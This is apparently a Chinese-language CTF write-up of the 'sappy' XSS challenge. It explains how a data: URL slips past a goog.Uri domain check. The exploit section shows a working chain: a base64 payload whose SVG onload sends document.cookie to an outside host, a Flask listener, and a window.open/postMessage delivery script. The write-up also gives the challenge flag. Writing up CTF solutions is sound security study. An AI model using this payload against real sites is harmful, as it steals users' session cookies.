# sappy

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/945b7796-12ab-41ea-9301-994ea869a81f)

## 概述

這題網站長這樣

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/2304d75c-2581-4bed-916e-af192c608def)

這四個按鈕會分別顯示個別設定好的 html

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/0a16eee7-b24a-438d-854f-e6968be8b914)

下面 share 則是傳遞任意網址他們的 bot 就會去瀏覽那個網址

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/19ff9088-666b-4b7a-984d-bbe035be8df5)

看到這裡應該可以猜到又是 XSS

來看一下前端 html `indeex.html`

```html
      <p>
        Hi! I'm a beginner in programming and this is my first application,
        called SAPPY! I'm sharing here some quirks I learnt about JavaScript.
        Use the buttons below to find out!
      </p>
      <div id="pages" class="row flex-center"></div>
      <iframe></iframe>
```

```js
      const iframe = document.querySelector("iframe");

      function onIframeLoad() {
        iframe.contentWindow.postMessage(
          `
            {
                "method": "initialize", 
                "host": "https://sappy-web.2024.ctfcompetition.com"
            }`,
          window.origin
        );
      }

      iframe.src = "./sap.html";
      iframe.addEventListener("load", onIframeLoad);
//.............
      fetch("pages.json")
        .then((r) => r.json())
        .then((json) => {
          for (const [id, { title }] of Object.entries(json)) {
            const button = document.createElement("button");
            button.setAttribute("class", "margin");
            button.innerText = title;
            button.addEventListener("click", () => switchPage(id));
            divPages.append(button);
          }
        });

      function switchPage(id) {
        const msg = JSON.stringify({
          method: "render",
          page: id,
        });
        iframe.contentWindow.postMessage(msg, window.origin);
      }
```

可以看到他的按鈕跟顯示是用 iframe，按鈕用 `postMessage` 來控制 iframe，按鈕則是依照 `/pages.json` 來生成，iframe 會去瀏覽 `./sap.html`

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <style>
      body {
        margin: 0;
      }
    </style>
  </head>
  <body>
    <div id="output"></div>
    <script src="./static/sap.js"></script>
    <script type="module">
      const INTERVAL = 100;
      let lastHeight = -1;
      setInterval(() => {
        const height = document.body.clientHeight;
        if (height === lastHeight) return;
        lastHeight = height;
        parent.postMessage(
          JSON.stringify({
            method: "heightUpdate",
            height: height,
          }),
          "*"
        );
      }, INTERVAL);
    </script>
  </body>
</html>
```

裡面使用了 `./static/sap.js` 這邊的 js 在架網站時是有過 compile 的，所以 f5 看不到原始碼。

來看看他如何載入文字

```js
const Uri = goog.require("goog.Uri");

function getHost(options) {
  if (!options.host) {
    const u = Uri.parse(document.location);

    return u.scheme + "://sappy-web.2024.ctfcompetition.com";
  }
  return validate(options.host);
}

function validate(host) {
  const h = Uri.parse(host);
  console.log(host);
  console.log(h.getDomain());
  if (h.hasQuery()) {
    throw "invalid host";
  }
  if (h.getDomain() !== "sappy-web.2024.ctfcompetition.com") {
    throw "invalid host";
  }
  return host;
}

function buildUrl(options) {
  return getHost(options) + "/sap/" + options.page;
}

//....................................................

    switch (method) {
      case "initialize": {
        if (!data.host) return;
        API.host = data.host;
        console.log(API.host);
        break;
      }
      case "": {
        if (typeof data.page !== "string") return;
        const url = buildUrl({
          host: API.host,
          page: data.page,
        });
        const resp = await fetch(url);
        if (resp.status !== 200) {
          console.error("something went wrong");
          return;
        }
        const json = await resp.json();
        if (typeof json.html === "string") {
          output.innerHTML = json.html;
        }
        break;
      }
    }
```

可以看到他會先用 `postMessage` 的 `initialize` 設定好存取 page info 的 base url，接著用 `postMessage` 的 `render` 依照對應的 page id 跟 base url 來用 `buildUrl` 產生對應的 url，產生前他會對 base url 做一次檢查，如果 domain 不是 `sappy-web.2024.ctfcompetition.com` 就會直接 `invalid host`，如果是就直接 `<base url> + "/sap/" + <page id>`。

產生完 url 以後他會去該 url 取得 json，看一下後端 api 的程式 `app.js`

```
const pages = require("./pages.json");
//.....................................
app.get("/sap/:p", async (req, res) => {
  if (!pages.hasOwnProperty(req.params.p)) {
    res.status(404).send("not found");
    return res.end();
  }
  const p = pages[req.params.p];
  res.json(p);
});
```

他會去 `page.json` 取得對應 page id 的資料並回傳 json

```json
{
  "floating-point": {
    "title": "0.1 + 0.2 != 0.3",
    "html": "Because of the underyling floating point arithmetic, in JavaScript 0.1+0.2 is <b>not</b> equal to 0.3!"
  },
  "document-all": {
    "title": "document.all",
    "html": "document.all is an instance of Object, you can check it. But then: <code>typeof document.all === 'undefined'</code>!"
  },
  "plus-operator": {
    "title": "plus operator",
    "html": "Here's a little riddle: what is the result of <code>[]+{}</code>? It's <code>\"[object Object]\"</code>!"
  },
  "no-lowercase": {
    "title": "no lowercase characters",
    "html": "Do you know it's possible to call arbitrary JS code without using lowercase characters? Here I am calling <code>console.log(1)</code>: <code>[]['\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162']['\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162']('\\143\\157\\156\\163\\157\\154\\145\\56\\154\\157\\147\\50\\61\\51')()    </code>"
  }
}
```

`sap.js` 拿到 page info 以後會直接用 `innerHTML` 把 `json.html` 放進 `output` 裡，這邊會產生 xss

```js
        const json = await resp.json();
        if (typeof json.html === "string") {
          output.innerHTML = json.html;
        }
```

所以我們的目標是要自己架一個網站裡面會嵌入目標網站的 `sap.html` 然後再操作 page info url 去取得有 xss payload 的 page info 讓 `sap.html` 去載入造成 xss，再將自己架的網頁的 url 送給目標的 bot 取得 cookie。

## 解題

這題的重點是要如何繞 `if (h.getDomain() !== "sappy-web.2024.ctfcompetition.com")` 基本上除非 `goog.Uri` 有洞，否則不太可能繞過，但是他沒有限制 `scheme` 只能用 http 或 https，而 fetch 是可以塞 data scheme 的，所以我就可以構造以下 url

`data://sappy-web.2024.ctfcompetition.com/;base64,eyJodG1sIjoiPHN2Zz48c3ZnL29ubG9hZD0nd2luZG93LmxvY2F0aW9uPVwiaHR0cHM6Ly92cG4uY2h1bW15ZG5zLmNvbToyMDAwMC94c3NcIitkb2N1bWVudC5jb29raWUnPiJ9Cg==#`

其中 `data://sappy-web.2024.ctfcompetition.com/` 可以保證 `getDomain` 是 `sappy-web.2024.ctfcompetition.com` 然後 `;base64,` 表示後面的東西要過 base64 decode 接著後面的 base64 就是我們 payload 的 json

```json
{
  "html": "<svg><svg/onload='window.location=\"https://vpn.chummydns.com:20000/xss\"+document.cookie'>"
}
```

最後的 `#` 則是讓後面的 `/sap/<page id>` 變成 hash tag 來忽略掉。

這樣就能成功 xss 了。

但是還有一個問題是因為 `iframe` 內的網站是不會帶 cookie 的，所以要找別的方法載入網站並控制，而這邊選擇用 `window.open` 來解決。

## exploit

```python
#!/usr/bin/env python3

from flask import Flask,request,redirect,Response,render_template
import json

app = Flask(__name__)

@app.route('/',methods=['GET'])
def root():
    return render_template('index.html')

@app.route('/<path:data>',methods=['GET'])
def hack(data=''):
    return "hack"

if __name__ == "__main__":
    app.run(host="::", port=20000)
```

```html
<script>
    const url = 'https://sappy-web.2024.ctfcompetition.com'
    win = window.open(`${url}/sap.html`);
    function hack() {
        win.postMessage(JSON.stringify({
                method: "initialize",
                host: "data://sappy-web.2024.ctfcompetition.com/;base64,eyJodG1sIjoiPHN2Zz48c3ZnL29ubG9hZD0nd2luZG93LmxvY2F0aW9uPVwiaHR0cHM6Ly92cG4uY2h1bW15ZG5zLmNvbToyMDAwMC94c3NcIitkb2N1bWVudC5jb29raWUnPiJ9Cg==#",
        }), url);
        win.postMessage(JSON.stringify({
            method: "render",
            page: "xss",
        }), url);
        loadpage();
    }
    setTimeout(hack, "1000");
</script>
```

## Flag

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/4fd1f3cf-3790-4762-99d9-39a45298192a)

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/f87e4ed7-8eab-4618-8e48-df0fa4731c66)

`CTF{parsing_urls_is_always_super_tricky}`




